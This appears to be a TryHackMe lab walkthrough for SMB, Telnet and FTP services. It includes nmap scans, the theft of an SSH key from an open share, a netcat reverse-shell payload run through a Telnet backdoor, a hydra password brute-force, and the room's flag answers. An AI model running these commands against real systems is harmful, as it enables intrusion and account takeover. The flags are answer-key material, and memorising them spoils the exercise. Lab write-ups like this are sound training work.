@@ -1,0 +1,135 @@
+# Try Hack Me | Network Services
+
+
+## SMB
+Server Message Block
+
+1. Discover open ports
+Stealth Scan
+```
+sudo nmap -p- -sS -O -oN smb_nmap 10.10.78.151
+```
+X Mas Tree Noisy Scan
+```
+sudo nmap -p- -sX -T5 -O -oN smb_nmap 10.10.78.151
+```
+
+2. SMB is used for sharing access to files, prnters, serial ports an other resources. It is a request-response protocol used for client-server communication.
+
+3. Enum4Linux
+`enum4linux` is a tool for active enumeration of SMB information
+
+Full basic scan
+```
+enum4linux -a 10.10.78.151
+```
+
+4. Accessing SMB Shares
+We can remotely access the SMB share using the syntax:
+```
+smbclient //[IP]/[SHARE]
+```
+
+Followed by the tags:
+```
+-U      #name: to specify the user
+-p      #port: to specify the port
+```
+
+Example:
+```
+smbclient //10.10.78.151/profiles -U  -P 
+```
+
+5. Download file from SMB server
+```
+smbget smb://10.10.78.151/profiles/.ssh/id_rsa -U 'Anonymous'
+```
+
+6. Connect to server over SSH:
+```
+username is probably something like: cactus@polosmb
+
+ ssh -i id_rsa cactus@10.10.78.151
+ ```
+
+ 7. Flag = THM{smb_is_fun_eh?}
+
+ ## Telnet
+An application protocol on `port 23`. Functionality has been commonly replaced with the use of SSH.
+
+1. Connecting via telnet:
+```
+telnet <IP> <PORT>
+```
+
+2. NMAP scan of telnet machine:
+```
+sudo nmap -p- -sX -T5 -O -oN telnet_nmap 10.10.203.96
+```
+
+3. Note the banner info:
+```
+Trying 10.10.203.96...
+Connected to 10.10.203.96.
+Escape character is '^]'.
+```
+4. Check that connection can be established
+```
+sudo tcpdump ip proto \\icmp -i tun0
+```
+
+4. Create a reverse shell payload:
+msfvenom command:
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=10.6.74.209 lport=4444 R
+```
+Output:
+```
+mkfifo /tmp/ffffhfb; nc 10.6.74.209 4444 0</tmp/ffffhfb | /bin/sh >/tmp/ffffhfb 2>&1; rm /tmp/ffffhfb
+```
+
+5. Create netcat listener on local machine:
+```
+nc -lvp 4444
+```
+
+6. Run command on telnet server:
+```
+.RUN mkfifo /tmp/ffffhfb; nc 10.6.74.209 4444 0</tmp/ffffhfb | /bin/sh >/tmp/ffffhfb 2>&1; rm /tmp/ffffhfb
+```
+
+7. Retrieve flag:
+```
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+```
+
+## FTP
+Client-server communication protocol typically found on `port 21`
+
+1. getting help for commands:
+```
+#help
+tool --help/-help/-h
+#manpages
+man tool
+```
+
+2. Check if ftp client is installed
+```
+ftp
+
+#results in the prompt: 
+ftp>
+```
+
+3. If anonymous login is allowed:
+```
+ftp <ip address>
+```
+when prompted, enter the username: anonymous and leave the password blank
+
+4. We foudn an admin name so we will try to use it as a login, while using hydra to generate passwords for login attempts:
+```
+hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.215.123 ftp
+```
